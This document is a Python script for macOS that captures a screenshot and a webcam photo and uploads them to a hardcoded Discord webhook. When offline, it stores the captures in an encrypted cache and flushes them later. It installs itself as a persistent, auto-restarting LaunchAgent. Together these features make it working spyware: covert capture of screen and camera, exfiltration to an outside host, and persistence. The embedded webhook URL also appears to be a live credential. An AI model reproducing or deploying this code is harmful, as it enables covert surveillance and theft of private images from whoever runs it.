"""
📸 MACOS SINGLE-SHOT CAPTURE - DISCORD + OFFLINE-FIRST 🍎
- Works on macOS
- Takes ONE screenshot + ONE webcam photo
- Sends to Discord if online
- Saves locally if offline, sends when back online
"""

import os
import time
import json
import socket
import subprocess
import pyautogui
import cv2
import requests
from datetime import datetime
from cryptography.fernet import Fernet

# ==================== CONFIG ====================
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1544527476167020656/LgdcAODvxTuOA-V1EB8U-snCxQ7lelHmukhEKGtbb7MwMC0a4UCntuRXtLprOAqr9nOj"

DATA_DIR = "offline_cache"
os.makedirs(DATA_DIR, exist_ok=True)
INDEX_FILE = os.path.join(DATA_DIR, "index.json")
# =================================================

# ---------- ENCRYPTION ----------
KEY_FILE = os.path.join(DATA_DIR, "key.key")
if os.path.exists(KEY_FILE):
    with open(KEY_FILE, 'rb') as f:
        key = f.read()
else:
    key = Fernet.generate_key()
    with open(KEY_FILE, 'wb') as f:
        f.write(key)

cipher = Fernet(key)

# ---------- MACOS SPECIFIC ----------
def is_mac():
    return os.name == 'posix' and os.uname().sysname == 'Darwin'

def get_mac_window_title():
    """Get active window title on macOS"""
    try:
        # Using AppleScript to get active window
        script = '''
        tell application "System Events"
            tell process 1 where frontmost is true
                return name of first window
            end tell
        end tell
        '''
        result = subprocess.run(['osascript', '-e', script], capture_output=True, text=True)
        return result.stdout.strip() or "Unknown"
    except:
        return "Unknown"

def is_online():
    try:
        socket.create_connection(("8.8.8.8", 53), timeout=3)
        return True
    except OSError:
        return False

# ---------- STORAGE ----------
def load_index():
    if os.path.exists(INDEX_FILE):
        with open(INDEX_FILE, 'r') as f:
            return json.load(f)
    return []

def save_index(index):
    with open(INDEX_FILE, 'w') as f:
        json.dump(index, f)

def save_offline(data_bytes, filename, data_type):
    encrypted_data = cipher.encrypt(data_bytes)
    filepath = os.path.join(DATA_DIR, filename)
    with open(filepath, 'wb') as f:
        f.write(encrypted_data)
    
    index = load_index()
    index.append({
        'filename': filename,
        'timestamp': datetime.now().isoformat(),
        'type': data_type,
        'size': len(encrypted_data)
    })
    save_index(index)
    print(f"[📁] Saved offline: {filename}")

# ---------- CAPTURE ----------
def capture_screenshot():
    screenshot = pyautogui.screenshot()
    import io
    img_bytes = io.BytesIO()
    screenshot.save(img_bytes, format='JPEG', quality=70)
    return img_bytes.getvalue()

def capture_webcam():
    try:
        cap = cv2.VideoCapture(0)
        cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
        cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)
        ret, frame = cap.read()
        cap.release()
        if ret:
            _, img_encoded = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 70])
            return img_encoded.tobytes()
        return None
    except:
        return None

def capture_both():
    """Capture both screenshot and webcam"""
    screenshot = capture_screenshot()
    webcam = capture_webcam()
    return screenshot, webcam

# ---------- SEND TO DISCORD ----------
def send_to_discord(data_bytes, filename):
    try:
        files = {
            'file': (filename, data_bytes, 'image/jpeg')
        }
        response = requests.post(DISCORD_WEBHOOK, files=files, timeout=30)
        return response.status_code in [200, 204]
    except Exception as e:
        print(f"[!] Discord error: {e}")
        return False

def send_to_discord_multiple(files_list):
    success = True
    for data_bytes, filename in files_list:
        if not send_to_discord(data_bytes, filename):
            success = False
    return success

# ---------- FLUSH OFFLINE DATA ----------
def flush_offline_data():
    index = load_index()
    if not index:
        print("[📭] No offline data to send.")
        return
    
    print(f"[📤] Sending {len(index)} offline files to Discord...")
    to_delete = []
    
    for item in index:
        filepath = os.path.join(DATA_DIR, item['filename'])
        if os.path.exists(filepath):
            with open(filepath, 'rb') as f:
                encrypted_data = f.read()
            data_bytes = cipher.decrypt(encrypted_data)
            if send_to_discord(data_bytes, item['filename']):
                to_delete.append(filepath)
                print(f"[✅] Sent: {item['filename']}")
            else:
                print(f"[!] Failed: {item['filename']}")
    
    for filepath in to_delete:
        try:
            os.remove(filepath)
            print(f"[🗑️] Deleted: {os.path.basename(filepath)}")
        except:
            pass
    
    save_index([])

# ---------- MACOS STARTUP (Launch Agent) ----------
def add_to_startup_mac():
    """Add to macOS startup using LaunchAgent"""
    try:
        # Get current script path
        if getattr(sys, 'frozen', False):
            script_path = sys.executable
        else:
            script_path = os.path.abspath(__file__)
        
        # Create LaunchAgent plist
        plist_content = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.user.capture</string>
    <key>ProgramArguments</key>
    <array>
        <string>{script_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>'''
        
        plist_path = os.path.expanduser("~/Library/LaunchAgents/com.user.capture.plist")
        with open(plist_path, 'w') as f:
            f.write(plist_content)
        
        # Load the LaunchAgent
        subprocess.run(['launchctl', 'load', plist_path], capture_output=True)
        print("[+] Added to macOS startup!")
    except Exception as e:
        print(f"[!] Startup error: {e}")

# ---------- MAIN ----------
def main():
    print("="*60)
    print("🍎 MACOS SINGLE-SHOT CAPTURE - DISCORD")
    print("="*60)
    print("[+] Takes ONE screenshot + ONE webcam photo")
    print("[+] Sends to Discord if online")
    print("[+] Saves locally if offline (sends later)")
    print("[+] macOS compatible")
    print("="*60)
    print()
    
    # Add to startup (macOS)
    add_to_startup_mac()
    
    # Check for offline data on startup
    if is_online():
        print("[🌐] Online! Checking for offline data...")
        flush_offline_data()
    
    try:
        # Capture both
        print("[📸] Capturing screenshot + webcam...")
        screenshot_data, webcam_data = capture_both()
        
        if is_online():
            print("[🌐] Online - Sending to Discord...")
            
            files_to_send = []
            if screenshot_data:
                filename = f"screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
                files_to_send.append((screenshot_data, filename))
            
            if webcam_data:
                filename = f"webcam_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
                files_to_send.append((webcam_data, filename))
            
            if files_to_send:
                if send_to_discord_multiple(files_to_send):
                    print("[✅] All sent to Discord!")
                else:
                    print("[!] Some failed - saving offline...")
                    for data_bytes, filename in files_to_send:
                        if not send_to_discord(data_bytes, filename):
                            data_type = 'screenshot' if 'screenshot' in filename else 'webcam'
                            save_offline(data_bytes, filename, data_type)
            
            flush_offline_data()
            
        else:
            print("[📴] Offline - Saving locally...")
            
            if screenshot_data:
                filename = f"screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
                save_offline(screenshot_data, filename, 'screenshot')
            
            if webcam_data:
                filename = f"webcam_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
                save_offline(webcam_data, filename, 'webcam')
            
            print("[✅] Saved offline! Will send when back online.")
        
        print("\n[+] Done! Press Ctrl+C to exit.")
        
        while True:
            if is_online():
                index = load_index()
                if index:
                    print("[🌐] Internet restored! Flushing offline data...")
                    flush_offline_data()
            time.sleep(10)
            
    except KeyboardInterrupt:
        print("\n[+] Stopping...")
        print("[+] Done!")

if __name__ == "__main__":
    import sys
    main()